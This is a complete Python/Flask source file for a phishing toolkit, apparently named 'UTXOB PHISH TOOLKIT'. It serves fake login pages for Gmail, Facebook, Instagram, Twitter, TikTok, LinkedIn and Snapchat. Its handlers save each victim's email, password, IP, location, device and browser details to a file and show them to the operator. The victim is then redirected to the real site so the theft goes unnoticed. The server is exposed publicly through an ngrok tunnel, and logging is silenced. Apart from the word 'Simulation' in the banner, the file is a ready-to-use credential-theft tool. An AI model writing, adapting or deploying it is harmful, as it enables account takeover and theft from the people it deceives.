import os
import sys
import time
import socket
import shutil
import logging
import threading
import subprocess
import urllib.request
import json
from datetime import datetime

from flask import Flask, render_template, request, redirect
from colorama import Fore, Style, init

init(autoreset=True)

# ---------- Suppress browser/GPU/system warnings ----------
os.environ['CHROME_LOG_LEVEL'] = '3'
os.environ['GLOG_minloglevel'] = '3'
os.environ['MESA_DEBUG'] = 'silent'
os.environ['LIBVA_MESSAGING_LEVEL'] = '0'
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
os.environ['VK_LOADER_DEBUG'] = 'none'

import warnings
warnings.filterwarnings("ignore")

# ---------- Disable ALL Flask/Werkzeug logging ----------
logging.getLogger('werkzeug').disabled = True
logging.getLogger('werkzeug').setLevel(logging.CRITICAL)

app = Flask(__name__)
app.logger.disabled = True
app.logger.setLevel(logging.CRITICAL)

from werkzeug.serving import WSGIRequestHandler


class QuietHandler(WSGIRequestHandler):
    def log(self, *args, **kwargs): pass
    def log_request(self, *args, **kwargs): pass
    def log_error(self, *args, **kwargs): pass
    def log_message(self, *args, **kwargs): pass


# ---------- Config ----------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')
DATA_FILE = os.path.join(BASE_DIR, 'saved_data.txt')

OFFICIAL_URLS = {
    'Gmail':     'https://accounts.google.com/signin',
    'Facebook':  'https://www.facebook.com/login',
    'Instagram': 'https://www.instagram.com/accounts/login/',
    'Twitter':   'https://twitter.com/i/flow/login',
    'TikTok':    'https://www.tiktok.com/login',
    'LinkedIn':  'https://www.linkedin.com/login',
    'Snapchat':  'https://accounts.snapchat.com/accounts/login',
}

SITES = {
    '1': {'name': 'Gmail',     'route': 'gmail',     'color': Fore.RED},
    '2': {'name': 'Facebook',  'route': 'facebook',  'color': Fore.BLUE},
    '3': {'name': 'Instagram', 'route': 'instagram', 'color': Fore.MAGENTA},
    '4': {'name': 'Twitter',   'route': 'twitter',   'color': Fore.CYAN},
    '5': {'name': 'TikTok',    'route': 'tiktok',    'color': Fore.WHITE},
    '6': {'name': 'LinkedIn',  'route': 'linkedin',  'color': Fore.BLUE},
    '7': {'name': 'Snapchat',  'route': 'snapchat',  'color': Fore.YELLOW},
}

STATE = {
    'active_route': None,
    'ngrok_url': None,
    'ngrok_proc': None,
}


# ---------- Network helpers ----------
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def ngrok_installed():
    return shutil.which('ngrok') is not None


def is_ngrok_running():
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=1) as resp:
            return True
    except Exception:
        return False


def get_ngrok_url():
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=1.5) as resp:
            data = json.loads(resp.read().decode())
        tunnels = data.get('tunnels', [])
        for t in tunnels:
            url = t.get('public_url', '')
            if url.startswith('https://'):
                return url
        if tunnels:
            return tunnels[0].get('public_url', '')
    except Exception:
        return None
    return None


def start_ngrok():
    if not ngrok_installed():
        return None, "ngrok not installed"
    if is_ngrok_running():
        return get_ngrok_url(), None
    try:
        creationflags = 0
        if os.name == 'nt':
            creationflags = subprocess.CREATE_NO_WINDOW
        proc = subprocess.Popen(
            ['ngrok', 'http', '5000', '--log=stdout', '--log-format=json'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=creationflags,
        )
        STATE['ngrok_proc'] = proc
        for _ in range(20):
            time.sleep(0.4)
            url = get_ngrok_url()
            if url:
                return url, None
        return None, "ngrok did not start in time"
    except Exception as e:
        return None, str(e)


def stop_ngrok():
    proc = STATE.get('ngrok_proc')
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        STATE['ngrok_proc'] = None


# ---------- Save helper ----------
def save_credentials(site, email, password, extra=None):
    now = datetime.now()
    timestamp = now.strftime('%d/%m/%Y %I:%M:%S %p')

    line = f"[{timestamp}] [{site.upper()}] Email: {email} | Password: {password}"
    if extra:
        for key in ('ip', 'geo', 'device', 'browser', 'os', 'screen', 'tz', 'lang'):
            val = extra.get(key)
            if val and val != 'Unknown':
                line += f" | {key.capitalize()}: {val}"
    line += "\n"

    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(line)

    color = Fore.GREEN
    print("\n" + color + "=" * 55 + Style.RESET_ALL)
    print(color + f"  NEW {site.upper()} LOGIN DATA" + Style.RESET_ALL)
    print(color + "=" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  Email    : " + Style.RESET_ALL + str(email))
    print(Fore.CYAN + "  Password : " + Style.RESET_ALL + str(password))
    print(Fore.CYAN + "  Time     : " + Style.RESET_ALL + timestamp)

    if extra:
        if extra.get('ip') and extra['ip'] != 'Unknown':
            print(Fore.CYAN + "  IP       : " + Style.RESET_ALL + extra['ip'])
        if extra.get('geo') and extra['geo'] != 'Unknown':
            print(Fore.CYAN + "  Location : " + Style.RESET_ALL + extra['geo'])
        if extra.get('device') and extra['device'] != 'Unknown':
            print(Fore.CYAN + "  Device   : " + Style.RESET_ALL + extra['device'])
        if extra.get('browser') and extra['browser'] != 'Unknown':
            b = extra['browser']
            print(Fore.CYAN + "  Browser  : " + Style.RESET_ALL + (b[:60] + '...' if len(b) > 60 else b))
        if extra.get('os') and extra['os'] != 'Unknown':
            print(Fore.CYAN + "  OS       : " + Style.RESET_ALL + extra['os'])

    print(Fore.CYAN + "  Saved to : " + Style.RESET_ALL + DATA_FILE)
    print(color + "=" * 55 + Style.RESET_ALL + "\n")


# ---------- Routes ----------
@app.route('/')
def home():
    route = STATE.get('active_route')
    if route:
        return render_template(f"{route}.html")
    return "Server running. Select an option in terminal."


@app.route('/gmail')
def gmail(): return render_template('gmail.html')


@app.route('/facebook')
def facebook(): return render_template('facebook.html')


@app.route('/instagram')
def instagram(): return render_template('instagram.html')


@app.route('/twitter')
def twitter(): return render_template('twitter.html')


@app.route('/tiktok')
def tiktok(): return render_template('tiktok.html')


@app.route('/linkedin')
def linkedin(): return render_template('linkedin.html')


@app.route('/snapchat')
def snapchat(): return render_template('snapchat.html')


# ---------- Login POST handlers ----------
def handle_login(site):
    email = request.form.get('email')
    password = request.form.get('password')

    extra = {
        'ip':      request.form.get('ip_address'),
        'geo':     request.form.get('geo_location'),
        'device':  request.form.get('device_type'),
        'browser': request.form.get('browser_info'),
        'os':      request.form.get('os_info'),
        'screen':  request.form.get('screen_resolution'),
        'tz':      request.form.get('timezone'),
        'lang':    request.form.get('language'),
    }

    save_credentials(site, email, password, extra)
    return redirect(OFFICIAL_URLS.get(site, '/'))


@app.route('/gmail/login', methods=['POST'])
def gmail_login(): return handle_login('Gmail')


@app.route('/facebook/login', methods=['POST'])
def facebook_login(): return handle_login('Facebook')


@app.route('/instagram/login', methods=['POST'])
def instagram_login(): return handle_login('Instagram')


@app.route('/twitter/login', methods=['POST'])
def twitter_login(): return handle_login('Twitter')


@app.route('/tiktok/login', methods=['POST'])
def tiktok_login(): return handle_login('TikTok')


@app.route('/linkedin/login', methods=['POST'])
def linkedin_login(): return handle_login('LinkedIn')


@app.route('/snapchat/login', methods=['POST'])
def snapchat_login(): return handle_login('Snapchat')


# ---------- Server runner ----------
def start_server(route=None):
    STATE['active_route'] = route
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        use_reloader=False,
        threaded=True,
        request_handler=QuietHandler,
    )


def run_server_blocking(route):
    STATE['active_route'] = route

    server_thread = threading.Thread(target=start_server, args=(route,), daemon=True)
    server_thread.start()
    time.sleep(1.2)

    local_ip = get_local_ip()
    localhost_url = "http://localhost:5000"
    lan_url = f"http://{local_ip}:5000"

    print(Fore.YELLOW + "\n  Starting ngrok..." + Style.RESET_ALL)
    ngrok_url, err = start_ngrok()
    STATE['ngrok_url'] = ngrok_url

    print(Fore.GREEN + "=" * 55 + Style.RESET_ALL)
    print(Fore.GREEN + "  SERVER RUNNING" + Style.RESET_ALL)
    print(Fore.GREEN + "=" * 55 + Style.RESET_ALL)
    print(Fore.CYAN + "  Localhost : " + Style.RESET_ALL + localhost_url)
    print(Fore.CYAN + "  LAN / IP  : " + Style.RESET_ALL + lan_url)
    if ngrok_url:
        print(Fore.MAGENTA + "  Ngrok     : " + Style.RESET_ALL + ngrok_url)
    else:
        reason = err or "unknown error"
        print(Fore.YELLOW + "  Ngrok     : " + Style.RESET_ALL + f"failed ({reason})")
    print(Fore.GREEN + "-" * 55 + Style.RESET_ALL)
    print("  Press " + Fore.YELLOW + "ENTER" + Style.RESET_ALL + " to stop server and go back to menu.")
    print(Fore.GREEN + "=" * 55 + Style.RESET_ALL)

    try:
        input()
    except KeyboardInterrupt:
        pass

    print(Fore.RED + "\n  Stopping server..." + Style.RESET_ALL)
    stop_ngrok()
    os._exit(0)


# ---------- Tool UI ----------
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


def banner():
    border = "═" * 59
    print(Fore.CYAN + "╔" + border + "╗" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "   ██╗   ██╗████████╗██╗  ██╗ ██████╗ ██████╗           " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "   ██║   ██║╚══██╔══╝╚██╗██╔╝██╔═══██╗██╔══██╗          " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "   ██║   ██║   ██║    ╚███╔╝ ██║   ██║██████╔╝          " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "   ██║   ██║   ██║    ██╔██╗ ██║   ██║██╔══██╗          " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "   ╚██████╔╝   ██║   ██╔╝ ██╗╚██████╔╝██████╔╝          " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "    ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝           " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + " " * 59 + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "              >> " + Style.RESET_ALL +
          Fore.CYAN + Style.BRIGHT + "UTXOB PHISH TOOLKIT" + Style.RESET_ALL +
          Fore.CYAN + " <<                    " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.CYAN + "              Phishing Simulation • v1.0                   " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + " " * 59 + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "║" + Style.RESET_ALL +
          Fore.MAGENTA + "      Localhost • LAN • Ngrok    |    by @utxob            " + Style.RESET_ALL +
          Fore.CYAN + "║" + Style.RESET_ALL)
    print(Fore.CYAN + "╚" + border + "╝" + Style.RESET_ALL)


def menu():
    print(Fore.YELLOW + "\n  Select an option:\n" + Style.RESET_ALL)
    for key, site in SITES.items():
        print(f"   {site['color']}[{key}] {site['name']}" + Style.RESET_ALL)
    print(Fore.YELLOW + "   [8] View saved data" + Style.RESET_ALL)
    print(Fore.YELLOW + "   [9] Clear saved data" + Style.RESET_ALL)
    print(Fore.RED + "   [0] Exit" + Style.RESET_ALL)
    print()


def view_saved_data():
    clear()
    banner()
    print(Fore.YELLOW + "\n  SAVED DATA\n" + Style.RESET_ALL)
    print("-" * 55)

    if not os.path.exists(DATA_FILE):
        print(Fore.RED + "  No saved data yet." + Style.RESET_ALL)
    else:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            content = f.read().strip()
        if content:
            print(content)
        else:
            print(Fore.RED + "  File is empty." + Style.RESET_ALL)

    print("-" * 55)
    input(Fore.CYAN + "\n  Press ENTER to return to menu..." + Style.RESET_ALL)


def clear_saved_data():
    clear()
    banner()
    print(Fore.YELLOW + "\n  CLEAR SAVED DATA\n" + Style.RESET_ALL)

    if not os.path.exists(DATA_FILE):
        print(Fore.RED + "  No file to clear." + Style.RESET_ALL)
        input(Fore.CYAN + "\n  Press ENTER to return..." + Style.RESET_ALL)
        return

    confirm = input(Fore.RED + "  Are you sure? (y/n): " + Style.RESET_ALL).strip().lower()
    if confirm == 'y':
        open(DATA_FILE, 'w').close()
        print(Fore.GREEN + "\n  File cleared." + Style.RESET_ALL)
    else:
        print(Fore.YELLOW + "\n  Cancelled." + Style.RESET_ALL)
    input(Fore.CYAN + "\n  Press ENTER to return..." + Style.RESET_ALL)


def main():
    while True:
        clear()
        banner()
        menu()
        choice = input(Fore.CYAN + "  Enter your choice: " + Style.RESET_ALL).strip()

        if choice in SITES:
            clear()
            banner()
            route = SITES[choice]['route']
            run_server_blocking(route)
        elif choice == '8':
            view_saved_data()
        elif choice == '9':
            clear_saved_data()
        elif choice == '0':
            clear()
            print(Fore.GREEN + "\n  Goodbye!\n" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "\n  [!] Invalid choice." + Style.RESET_ALL)
            input("  Press ENTER to continue...")


if __name__ == "__main__":
    main()